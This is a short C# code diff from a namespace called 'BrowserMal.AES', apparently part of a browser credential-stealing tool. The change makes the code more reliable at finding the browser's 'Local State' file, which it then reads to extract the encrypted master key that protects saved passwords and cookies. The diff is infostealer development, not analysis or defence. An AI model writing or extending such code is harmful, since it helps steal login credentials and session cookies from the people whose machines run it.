@@ -34,10 +34,16 @@ namespace BrowserMal.AES
             string parentPath = Directory.GetParent(basePath).Parent.FullName;
             string path = parentPath + "\\Local State";
 
-            if (!File.Exists(path))
+            if (!System.IO.File.Exists(path))
+            {
+                parentPath = Path.GetDirectoryName(basePath);
+                path = parentPath + "\\Local State";
+            }
+
+            if (!System.IO.File.Exists(path))
                 return null;
 
-            string jsonString = File.ReadAllText(path);
+            string jsonString = System.IO.File.ReadAllText(path);
 
             dynamic jsonObject = JsonConvert.DeserializeObject(jsonString);
             string key = jsonObject.os_crypt.encrypted_key;
